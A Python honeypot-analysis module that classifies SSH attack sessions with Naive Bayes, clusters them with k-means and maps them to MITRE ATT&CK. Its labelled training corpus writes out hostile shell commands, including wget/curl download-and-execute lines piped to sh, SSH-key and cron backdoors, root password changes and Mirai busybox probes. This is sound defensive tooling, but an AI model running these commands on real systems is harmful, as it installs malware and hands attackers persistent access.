#!/usr/bin/env python3
"""
AI/ML analysis of stored attack sessions — "what kind of attack was this?"

Complements the botnet clustering (pipeline/cluster_lambda/botnet_clustering.py), which
groups attacking *IPs* by shared tooling ("who is coordinated"). This module looks at each
*attack session* ("what did they do") and runs three stages:

  1. Feature extraction  behaviour tokens (login attempts, success, commands, download)
                         + tokens from every shell command typed (wget, chmod, busybox, ...)
  2. Classification      multinomial Naive Bayes trained on a labelled corpus of known
                         honeypot attack patterns -> attack type + confidence + MITRE ATT&CK
                         techniques + the features that drove the decision (explainable)
  3. Clustering          unsupervised spherical k-means on TF-IDF vectors; k picked by the
                         best silhouette score; PCA projects every session to 2-D for plotting

The two halves check each other: the unsupervised clusters are compared with the supervised
labels (purity), so the model card shows whether both methods agree.

Pure Python (no numpy) so it runs anywhere the demo runs. Usable as a library
(`analyze(sessions)`) or a CLI over an exported /attacks JSON file.
"""

from __future__ import annotations

import argparse
import json
import math
import random
import re
import sys
import time
from collections import Counter, defaultdict
from pathlib import Path
from typing import Any, Iterable

# --------------------------------------------------------------------------- taxonomy
ATTACK_TYPES: dict[str, dict[str, Any]] = {
    "recon_scan": {
        "label": "Reconnaissance scan",
        "severity": "low",
        "description": "Connected and grabbed the SSH banner without trying to log in.",
        "mitre": [["T1595", "Active Scanning"]],
    },
    "brute_force": {
        "label": "SSH brute force",
        "severity": "medium",
        "description": "Guessed username/password pairs; every attempt failed.",
        "mitre": [["T1110.001", "Brute Force: Password Guessing"]],
    },
    "credential_compromise": {
        "label": "Credential compromise",
        "severity": "high",
        "description": "Logged in with a guessed or leaked credential but ran nothing (access check / resale).",
        "mitre": [["T1078", "Valid Accounts"], ["T1110", "Brute Force"]],
    },
    "discovery": {
        "label": "System discovery",
        "severity": "high",
        "description": "Logged in and fingerprinted the machine (OS, CPU, users, processes).",
        "mitre": [["T1082", "System Information Discovery"], ["T1033", "System Owner/User Discovery"]],
    },
    "malware_dropper": {
        "label": "Malware download & execution",
        "severity": "critical",
        "description": "Downloaded a payload (often a cryptominer or bot) and executed it.",
        "mitre": [["T1105", "Ingress Tool Transfer"], ["T1059.004", "Unix Shell"], ["T1496", "Resource Hijacking"]],
    },
    "persistence": {
        "label": "Persistence (backdoor)",
        "severity": "critical",
        "description": "Planted an SSH key / changed passwords / added cron jobs to keep access.",
        "mitre": [["T1098.004", "SSH Authorized Keys"], ["T1053.003", "Cron"]],
    },
    "iot_botnet": {
        "label": "IoT botnet propagation",
        "severity": "high",
        "description": "Mirai-style worm: busybox probes and shell escapes used to recruit devices.",
        "mitre": [["T1059.004", "Unix Shell"], ["T1110.001", "Password Guessing"], ["T1498", "Network DoS (botnet use)"]],
    },
}

# --------------------------------------------------------------------------- features
_TOKEN = re.compile(r"[a-z][a-z0-9_]{1,24}")
_STOP = {"http", "https", "www", "com", "net", "org", "dev", "null", "var", "run", "mnt", "usr", "the", "and", "an"}
BEHAVIOUR_WEIGHT = 2  # behaviour tokens are repeated so they matter as much as a command


def _command_tokens(cmd: str) -> list[str]:
    out = []
    for t in _TOKEN.findall(cmd.lower()):
        if t in _STOP or sum(ch.isdigit() for ch in t) >= 3:  # drop hashes / key material
            continue
        out.append(t)
    return out


def behaviour_tokens(*, attempts: int, success: bool, commands: list[str], download: bool) -> list[str]:
    toks = []
    if attempts == 0:
        toks.append("b:no_login")
    elif attempts <= 2:
        toks.append("b:few_logins")
    else:
        toks.append("b:many_logins")
    if attempts:
        toks.append("b:login_success" if success else "b:login_failed")
    toks.append("b:has_commands" if commands else "b:no_commands")
    if len(commands) >= 3:
        toks.append("b:many_commands")
    if download:
        toks.append("b:download")
    return toks * BEHAVIOUR_WEIGHT


def features(*, attempts: int, success: bool, commands: list[str], download: bool) -> list[str]:
    toks = behaviour_tokens(attempts=attempts, success=success, commands=commands, download=download)
    for c in commands:
        toks.extend(_command_tokens(c))
    return toks


def session_features(s: dict[str, Any]) -> list[str]:
    """Tokens for one stored session summary (see demo/server.py `EventStore.sessions`)."""
    return features(
        attempts=int(s.get("login_attempts") or 0),
        success=bool(s.get("login_success")),
        commands=list(s.get("commands") or []),
        download=bool(s.get("downloads")),
    )


# --------------------------------------------------------------------------- training corpus
# Labelled examples of attack behaviour seen on public SSH honeypots (Cowrie/Kippo write-ups,
# Mirai source, cryptojacking reports). (label, login attempts, success, commands, download)
_URL = "http://192.0.2.50"
CORPUS: list[tuple[str, int, bool, list[str], bool]] = [
    # reconnaissance: connect, read banner, leave
    *[("recon_scan", 0, False, [], False)] * 6,
    # brute force: failed guesses only
    ("brute_force", 1, False, [], False), ("brute_force", 2, False, [], False),
    ("brute_force", 3, False, [], False), ("brute_force", 5, False, [], False),
    ("brute_force", 7, False, [], False), ("brute_force", 12, False, [], False),
    ("brute_force", 25, False, [], False), ("brute_force", 4, False, [], False),
    # credential compromise: successful login, nothing executed
    ("credential_compromise", 1, True, [], False), ("credential_compromise", 2, True, [], False),
    ("credential_compromise", 4, True, [], False), ("credential_compromise", 6, True, [], False),
    ("credential_compromise", 9, True, [], False),
    # system discovery
    ("discovery", 1, True, ["uname -a"], False),
    ("discovery", 3, True, ["cat /proc/cpuinfo | grep name | wc -l", "uname -a"], False),
    ("discovery", 2, True, ["whoami", "id"], False),
    ("discovery", 1, True, ["ls -la", "ps aux"], False),
    ("discovery", 4, True, ["cat /etc/passwd", "w"], False),
    ("discovery", 1, True, ["uptime", "lscpu", "df -h"], False),
    ("discovery", 2, True, ["ifconfig", "netstat -an"], False),
    ("discovery", 1, True, ["cat /etc/os-release", "history"], False),
    ("discovery", 3, True, ["top -bn1", "last", "env"], False),
    ("discovery", 1, True, ["uname -s -v -n -r -m", "cat /proc/meminfo"], False),
    # malware download & execution (bots, cryptominers)
    ("malware_dropper", 1, True, [f"cd /tmp && wget {_URL}/bins.sh && chmod +x bins.sh && ./bins.sh"], True),
    ("malware_dropper", 2, True, [f"curl -O {_URL}/x86; chmod 777 x86; ./x86"], True),
    ("malware_dropper", 1, True, ["cd /var/tmp; tftp -g -r mips 192.0.2.1; chmod 777 mips; ./mips"], True),
    ("malware_dropper", 3, True, [f"wget -q -O - {_URL}/i.sh | sh"], True),
    ("malware_dropper", 1, True, ["nproc", f"wget {_URL}/xmrig", "chmod +x xmrig", "./xmrig -o pool.example:3333"], True),
    ("malware_dropper", 2, True, ["free -m", "crontab -l", f"curl -s {_URL}/m.sh | bash"], True),
    ("malware_dropper", 1, True, [f"cd /tmp; wget {_URL}/kworker; chmod +x kworker; nohup ./kworker &"], True),
    ("malware_dropper", 4, True, ["nproc", f"cd /dev/shm && curl -fsSL {_URL}/c.sh -o c.sh && sh c.sh"], True),
    # persistence / backdoors
    ("persistence", 1, True, ['cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1 key" >> .ssh/authorized_keys',
                              "chattr +i ~/.ssh/authorized_keys"], False),
    ("persistence", 2, True, ["echo ssh-rsa AAAAB3Nza >> /root/.ssh/authorized_keys"], False),
    ("persistence", 1, True, ["chattr -ia .ssh; lockr -ia .ssh", "cat /etc/issue"], False),
    ("persistence", 3, True, ["echo 'root:N3wPass'|chpasswd"], False),
    ("persistence", 1, True, ["useradd -m -s /bin/bash backup", "echo backup:changeme|chpasswd"], False),
    ("persistence", 2, True, ["(crontab -l; echo '* * * * * /tmp/.sys') | crontab -"], False),
    ("persistence", 1, True, ["mkdir -p ~/.ssh", "echo ssh-ed25519 AAAAC3 >> ~/.ssh/authorized_keys", "chmod 600 ~/.ssh/authorized_keys"], False),
    # Mirai-style IoT worms
    ("iot_botnet", 1, True, ["enable", "system", "shell", "sh", "/bin/busybox MIRAI"], False),
    ("iot_botnet", 2, True, ["sh", "/bin/busybox ECCHI"], False),
    ("iot_botnet", 1, True, ["enable", "shell", "sh", "/bin/busybox ps", "/bin/busybox cat /proc/mounts"], False),
    ("iot_botnet", 3, True, ["linuxshell", "system", "/bin/busybox SORA"], False),
    ("iot_botnet", 1, True, ["system", "shell", "sh", "/bin/busybox echo -e '\\x67\\x61\\x79'"], False),
    ("iot_botnet", 2, True, ["enable", "system", "/bin/busybox OWARI"], False),
]


# --------------------------------------------------------------------------- Naive Bayes
class NaiveBayes:
    """Multinomial Naive Bayes with Laplace smoothing."""

    def __init__(self, alpha: float = 0.5) -> None:
        self.alpha = alpha
        self.classes: list[str] = []
        self.log_prior: dict[str, float] = {}
        self.log_lik: dict[str, dict[str, float]] = {}
        self.log_unseen: dict[str, float] = {}
        self.vocab: set[str] = set()

    def fit(self, docs: list[list[str]], labels: list[str]) -> "NaiveBayes":
        self.classes = sorted(set(labels))
        self.vocab = {t for d in docs for t in d}
        counts: dict[str, Counter] = defaultdict(Counter)
        n_docs = Counter(labels)
        for d, y in zip(docs, labels):
            counts[y].update(d)
        v = len(self.vocab)
        for c in self.classes:
            total = sum(counts[c].values())
            denom = total + self.alpha * v
            self.log_prior[c] = math.log(n_docs[c] / len(docs))
            self.log_lik[c] = {t: math.log((counts[c][t] + self.alpha) / denom) for t in self.vocab}
            self.log_unseen[c] = math.log(self.alpha / denom)
        return self

    def _scores(self, doc: list[str]) -> dict[str, float]:
        known = [t for t in doc if t in self.vocab]  # unseen tokens carry no class signal
        return {c: self.log_prior[c] + sum(self.log_lik[c][t] for t in known) for c in self.classes}

    def predict_proba(self, doc: list[str]) -> dict[str, float]:
        s = self._scores(doc)
        m = max(s.values())
        exp = {c: math.exp(v - m) for c, v in s.items()}
        z = sum(exp.values())
        return {c: v / z for c, v in exp.items()}

    def explain(self, doc: list[str], cls: str, runner_up: str, k: int = 4) -> list[str]:
        """Features present in `doc` that pushed hardest toward `cls` over the runner-up."""
        weight: Counter = Counter()
        for t in set(doc):
            if t in self.vocab:
                weight[t] = self.log_lik[cls][t] - self.log_lik[runner_up][t]
        return [t for t, w in weight.most_common(k) if w > 0]


def _train(corpus=CORPUS) -> tuple[NaiveBayes, list[list[str]], list[str]]:
    docs = [features(attempts=a, success=s, commands=c, download=d) for _, a, s, c, d in corpus]
    labels = [y for y, *_ in corpus]
    return NaiveBayes().fit(docs, labels), docs, labels


def leave_one_out_accuracy() -> float:
    _, docs, labels = _train()
    hits = 0
    for i in range(len(docs)):
        nb = NaiveBayes().fit(docs[:i] + docs[i + 1:], labels[:i] + labels[i + 1:])
        p = nb.predict_proba(docs[i])
        hits += max(p, key=p.get) == labels[i]
    return hits / len(docs)


_MODEL: NaiveBayes | None = None
_LOO: float | None = None


def model() -> NaiveBayes:
    global _MODEL
    if _MODEL is None:
        _MODEL = _train()[0]
    return _MODEL


def classify(tokens: list[str]) -> dict[str, Any]:
    nb = model()
    proba = nb.predict_proba(tokens)
    ranked = sorted(proba, key=proba.get, reverse=True)
    best, second = ranked[0], ranked[1]
    return {
        "attack_type": best,
        "confidence": round(proba[best], 4),
        "runner_up": second,
        "explanation": [t.replace("b:", "behaviour: ") for t in nb.explain(tokens, best, second)],
    }


# --------------------------------------------------------------------------- vectors
def _tfidf(docs: list[list[str]]) -> tuple[list[dict[int, float]], list[str]]:
    vocab = sorted({t for d in docs for t in d})
    index = {t: i for i, t in enumerate(vocab)}
    df = Counter(t for d in docs for t in set(d))
    n = len(docs)
    idf = {t: math.log((1 + n) / (1 + df[t])) + 1.0 for t in vocab}
    vecs = []
    for d in docs:
        tf = Counter(d)
        v = {index[t]: (c / len(d)) * idf[t] for t, c in tf.items()} if d else {}
        norm = math.sqrt(sum(x * x for x in v.values())) or 1.0
        vecs.append({i: x / norm for i, x in v.items()})
    return vecs, vocab


def _dot(a: dict[int, float], b: dict[int, float]) -> float:
    if len(a) > len(b):
        a, b = b, a
    return sum(x * b.get(i, 0.0) for i, x in a.items())


def _kmeans(vecs: list[dict[int, float]], k: int, *, seed: int = 7, iters: int = 30) -> list[int]:
    """Spherical k-means (cosine similarity) with k-means++ seeding."""
    rng = random.Random(seed)
    n = len(vecs)
    centers = [dict(vecs[rng.randrange(n)])]
    while len(centers) < k:
        d2 = [min(1.0 - _dot(v, c) for c in centers) ** 2 for v in vecs]
        total = sum(d2)
        if total <= 1e-12:
            break
        r, acc = rng.random() * total, 0.0
        for i, w in enumerate(d2):
            acc += w
            if acc >= r:
                centers.append(dict(vecs[i]))
                break
    labels = [0] * n
    for _ in range(iters):
        new = [max(range(len(centers)), key=lambda c: _dot(v, centers[c])) for v in vecs]
        if new == labels and _ > 0:
            break
        labels = new
        for c in range(len(centers)):
            members = [vecs[i] for i in range(n) if labels[i] == c]
            if not members:
                continue
            acc_v: dict[int, float] = defaultdict(float)
            for m in members:
                for i, x in m.items():
                    acc_v[i] += x
            norm = math.sqrt(sum(x * x for x in acc_v.values())) or 1.0
            centers[c] = {i: x / norm for i, x in acc_v.items()}
    return labels


def _silhouette(dist: list[list[float]], labels: list[int]) -> float:
    n = len(labels)
    groups = defaultdict(list)
    for i, l in enumerate(labels):
        groups[l].append(i)
    if len(groups) < 2:
        return -1.0
    total = 0.0
    for i in range(n):
        own = groups[labels[i]]
        a = sum(dist[i][j] for j in own if j != i) / (len(own) - 1) if len(own) > 1 else 0.0
        b = min(sum(dist[i][j] for j in g) / len(g) for l, g in groups.items() if l != labels[i])
        total += 0.0 if len(own) == 1 else (b - a) / max(a, b, 1e-12)
    return total / n


def _pca_2d(vecs: list[dict[int, float]], dim: int, *, iters: int = 60) -> list[list[float]]:
    """Top-2 principal components via power iteration on sparse rows (mean-centred implicitly)."""
    n = len(vecs)
    if n == 0 or dim == 0:
        return [[0.0, 0.0] for _ in vecs]
    mean = [0.0] * dim
    for v in vecs:
        for i, x in v.items():
            mean[i] += x / n

    def xv(w: list[float]) -> list[float]:  # (X - 1·mean) w
        mw = sum(m * wi for m, wi in zip(mean, w))
        return [sum(x * w[i] for i, x in v.items()) - mw for v in vecs]

    def xtu(u: list[float]) -> list[float]:  # (X - 1·mean)^T u
        out = [0.0] * dim
        for v, ui in zip(vecs, u):
            for i, x in v.items():
                out[i] += x * ui
        su = sum(u)
        return [o - m * su for o, m in zip(out, mean)]

    rng = random.Random(3)
    comps: list[list[float]] = []
    for _ in range(2):
        w = [rng.uniform(-1, 1) for _ in range(dim)]
        for _ in range(iters):
            w = xtu(xv(w))
            for c in comps:  # deflate
                proj = sum(a * b for a, b in zip(w, c))
                w = [a - proj * b for a, b in zip(w, c)]
            norm = math.sqrt(sum(a * a for a in w)) or 1.0
            w = [a / norm for a in w]
        comps.append(w)
    return [[round(a, 4), round(b, 4)] for a, b in zip(xv(comps[0]), xv(comps[1]))]


# --------------------------------------------------------------------------- pipeline
SILHOUETTE_SAMPLE = 400

_BEHAVIOUR_TEXT = {
    "b:no_login": "no login attempt",
    "b:few_logins": "1-2 login attempts",
    "b:many_logins": "3+ login attempts",
    "b:login_success": "login succeeded",
    "b:login_failed": "all logins failed",
    "b:has_commands": "ran commands",
    "b:many_commands": "3+ commands",
    "b:download": "downloaded a file",
}


def analyze(sessions: list[dict[str, Any]], *, k_range: Iterable[int] = range(2, 9)) -> dict[str, Any]:
    """Classify, cluster and project a list of session summaries. Returns a JSON-able dict."""
    global _LOO
    t0 = time.perf_counter()
    timings: dict[str, float] = {}

    def lap(name: str, start: float) -> float:
        now = time.perf_counter()
        timings[name] = round((now - start) * 1000, 1)
        return now

    ids = [str(s["id"]) for s in sessions]
    docs = [session_features(s) for s in sessions]
    t = lap("feature_extraction", t0)

    results = {sid: classify(d) for sid, d in zip(ids, docs)}
    if _LOO is None:
        _LOO = leave_one_out_accuracy()
    t = lap("classification", t)

    vecs, vocab = _tfidf(docs)
    n = len(vecs)
    best_k, best_sil, labels = 1, None, [0] * n
    if n >= 3:
        rng = random.Random(11)
        sample = sorted(rng.sample(range(n), min(n, SILHOUETTE_SAMPLE)))
        dist = [[1.0 - _dot(vecs[i], vecs[j]) for j in sample] for i in sample]
        for k in k_range:
            if k >= n:
                break
            lab = _kmeans(vecs, k)
            if len(set(lab)) < 2:
                continue
            sil = _silhouette(dist, [lab[i] for i in sample])
            if best_sil is None or sil > best_sil + 1e-9:
                best_k, best_sil, labels = k, sil, lab
    t = lap("clustering", t)

    coords = _pca_2d(vecs, len(vocab))
    t = lap("projection", t)

    # name each cluster after its dominant (supervised) attack type
    members: dict[int, list[int]] = defaultdict(list)
    for i, l in enumerate(labels):
        members[l].append(i)
    order = sorted(members, key=lambda c: -len(members[c]))
    renum = {old: new for new, old in enumerate(order)}
    global_df = Counter(t for d in docs for t in set(d))
    clusters = []
    agree = 0
    for old in order:
        idx = members[old]
        types = Counter(results[ids[i]]["attack_type"] for i in idx)
        dominant, count = types.most_common(1)[0]
        agree += count
        local_df = Counter(t for i in idx for t in set(docs[i]))
        # distinctive = common inside the cluster AND rare outside it
        distinct = sorted(
            (t for t in local_df if local_df[t] / len(idx) >= 0.3),
            key=lambda t: (-(local_df[t] / len(idx)) * math.log((n + 1) / global_df[t]), t),
        )
        clusters.append({
            "cluster": renum[old],
            "size": len(idx),
            "dominant_type": dominant,
            "label": ATTACK_TYPES[dominant]["label"],
            "purity": round(count / len(idx), 3),
            "type_mix": dict(types),
            "top_features": [t for t in distinct if not t.startswith("b:")][:5],
            "behaviour": [_BEHAVIOUR_TEXT[t] for t in distinct if t in _BEHAVIOUR_TEXT][:3],
        })
    # two clusters of the same type (e.g. short vs long brute force): tell them apart
    by_label: dict[str, list[dict[str, Any]]] = defaultdict(list)
    for c in clusters:
        by_label[c["label"]].append(c)
    for same in by_label.values():
        if len(same) < 2:
            continue
        for c in same:
            others = [o for o in same if o is not c]
            uniq_b = [b for b in c["behaviour"] if all(b not in o["behaviour"] for o in others)]
            uniq_f = [f for f in c["top_features"] if all(f not in o["top_features"] for o in others)]
            # commands describe a group better than login counts when there are any
            if uniq_f:
                hint = ", ".join(uniq_f[:2])
            else:
                hint = uniq_b[0] if uniq_b else f"group {c['cluster']}"
            c["label"] = f"{c['label']} ({hint})"

    per_session = {}
    for i, sid in enumerate(ids):
        r = results[sid]
        per_session[sid] = {
            **r,
            "attack_label": ATTACK_TYPES[r["attack_type"]]["label"],
            "severity": ATTACK_TYPES[r["attack_type"]]["severity"],
            "mitre": ATTACK_TYPES[r["attack_type"]]["mitre"],
            "ml_cluster": renum.get(labels[i], 0),
            "pca": coords[i],
        }

    type_counts = Counter(r["attack_type"] for r in results.values())
    timings["total"] = round((time.perf_counter() - t0) * 1000, 1)
    return {
        "scanned_sessions": n,
        "scanned_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "model": {
            "classifier": "Multinomial Naive Bayes",
            "training_examples": len(CORPUS),
            "classes": len(ATTACK_TYPES),
            "loo_accuracy": round(_LOO, 3),
            "clustering": "Spherical k-means on TF-IDF features (k chosen by silhouette)",
            "k": best_k,
            "silhouette": None if best_sil is None else round(best_sil, 3),
            "cluster_type_agreement": round(agree / n, 3) if n else None,
            "projection": "PCA (2 components)",
            "features": len(vocab),
        },
        "timings_ms": timings,
        "types": [
            {"type": k, **{f: v for f, v in ATTACK_TYPES[k].items()}, "count": type_counts.get(k, 0)}
            for k in ATTACK_TYPES
        ],
        "clusters": clusters,
        "sessions": per_session,
    }


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--input", type=Path, required=True, help='JSON from GET /attacks ({"attacks": [...]})')
    ap.add_argument("--output", type=Path, default=None)
    args = ap.parse_args()
    data = json.loads(args.input.read_text(encoding="utf-8"))
    sessions = data.get("attacks", data) if isinstance(data, dict) else data
    result = analyze(sessions)
    text = json.dumps(result, indent=2)
    if args.output:
        args.output.write_text(text, encoding="utf-8")
    else:
        sys.stdout.write(text + "\n")
    print(json.dumps(result["model"], indent=2), file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
